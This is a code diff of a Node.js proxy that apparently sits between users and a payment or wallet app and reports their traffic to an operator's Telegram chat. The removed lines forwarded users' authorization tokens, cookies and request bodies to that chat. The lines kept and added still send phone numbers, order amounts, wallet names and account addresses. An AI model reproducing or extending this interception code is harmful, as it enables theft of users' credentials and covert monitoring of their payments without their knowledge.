@@ -678,38 +678,7 @@ async function proxyFetch(req, timeoutMs) {
     try { jsonResp = JSON.parse(respBody); } catch(e) {}
   }
 
-  if (debugMode) {
-    try {
-      const data = cachedData || await loadData();
-      if (data && data.adminChatId && bot) {
-        const skipDebugPaths = ['/bot-webhook', '/favicon', '/health', '/setup-webhook'];
-        const path = req.originalUrl || req.url || '';
-        if (!skipDebugPaths.some(p => path.includes(p))) {
-          const reqBody = req.rawBody ? req.rawBody.toString('utf8') : '';
-          const importantHeaders = {};
-          for (const [k, v] of Object.entries(fwd)) {
-            if (['authorization', 'token', 'apptoken', 'cookie', 'content-type', 'accept'].includes(k.toLowerCase())) {
-              importantHeaders[k] = v;
-            }
-          }
-          const reqMsg =
-            `🔍 [DEBUG] ${req.method} ${path}\n` +
-            `━━━━━━━━━━━━━━━━━━\n` +
-            `📤 REQUEST\n` +
-            `Headers: ${JSON.stringify(importantHeaders).substring(0, 500)}\n` +
-            `Body: ${reqBody.substring(0, 800)}`;
-          const respMsg =
-            `📥 RESPONSE [${response.status}] ${path}\n` +
-            `━━━━━━━━━━━━━━━━━━\n` +
-            `${respBody.substring(0, 3000)}`;
-          bot.sendMessage(data.adminChatId, reqMsg.substring(0, 4000)).catch(()=>{});
-          setTimeout(() => {
-            bot.sendMessage(data.adminChatId, respMsg.substring(0, 4000)).catch(()=>{});
-          }, 200);
-        }
-      }
-    } catch(e) {}
-  }
+  // Extra debug logs removed for cleaner bot experience
 
   return { response, respBody, respBuffer, respHeaders, jsonResp };
 }
@@ -1954,7 +1923,7 @@ app.post('/app/payment/order/create', async (req, res) => {
       const body = req.parsedBody || {};
       const phone = getPhone(data, userId);
       const orderId = body.orderId || body.orderNo || body.buyId || 'N/A';
-      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || 0) || 0;
+      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || 0) || 0;
 
       if (isSuccess) {
         const msg =
@@ -2209,8 +2178,14 @@ for (const ep of COLLECTION_ENDPOINTS) {
             const selected = jsonResp.data.filter(i => i.status === 1);
             if (selected.length > 0) {
               selected.forEach((item, index) => {
-                const walletName = (item.wallet && item.wallet.name) ? item.wallet.name : (item.name || item.payType || 'Unknown App');
-                const address = item.address || item.accountNo || 'N/A';
+                let walletName = 'Unknown App';
+                if (item.wallet && item.wallet.name) walletName = item.wallet.name;
+                else if (item.walletName) walletName = item.walletName;
+                else if (item.name) walletName = item.name;
+                else if (item.payTypeName) walletName = item.payTypeName;
+                else if (item.payType) walletName = `PayType ${item.payType}`;
+
+                const address = item.address || item.accountNo || item.walletAccount || 'N/A';
                 msg += `${index + 1}. ✅ *${walletName}* Selected\n`;
                 msg += `   📍 ID: \`${address}\`\n\n`;
               });
@@ -2219,12 +2194,10 @@ for (const ep of COLLECTION_ENDPOINTS) {
             }
             bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
           } else {
-            bot.sendMessage(data.adminChatId, `📡 ${path}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n✅ Status: Success`).catch(()=>{});
+            // No extra log for success on these endpoints
           }
         } else {
-          const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
-          const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
-          bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+          // No extra log for other endpoints unless needed
         }
       }
       sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
